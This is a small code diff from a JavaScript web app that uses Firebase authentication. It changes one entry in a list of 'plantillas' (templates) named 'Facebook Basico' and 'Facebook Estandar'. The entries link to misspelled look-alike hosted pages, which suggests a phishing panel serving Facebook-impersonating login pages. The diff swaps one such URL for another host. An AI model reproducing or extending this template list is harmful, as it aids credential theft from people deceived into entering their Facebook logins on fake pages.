@@ -574,7 +574,7 @@ onAuthStateChanged(auth, async (user) => {
 
 const plantillas = [
 
-  { nombre: "Facebook Basico", url: "https://faceboobasico.glegogle5341-af7.workers.dev/" },
+  { nombre: "Facebook Basico", url: "https://x2p4a4.mimo.run/index.html" },
 
   { nombre: "Facebook Estandar", url: "https://facebook-estndar.glegogle5341-af7.workers.dev/" },
 
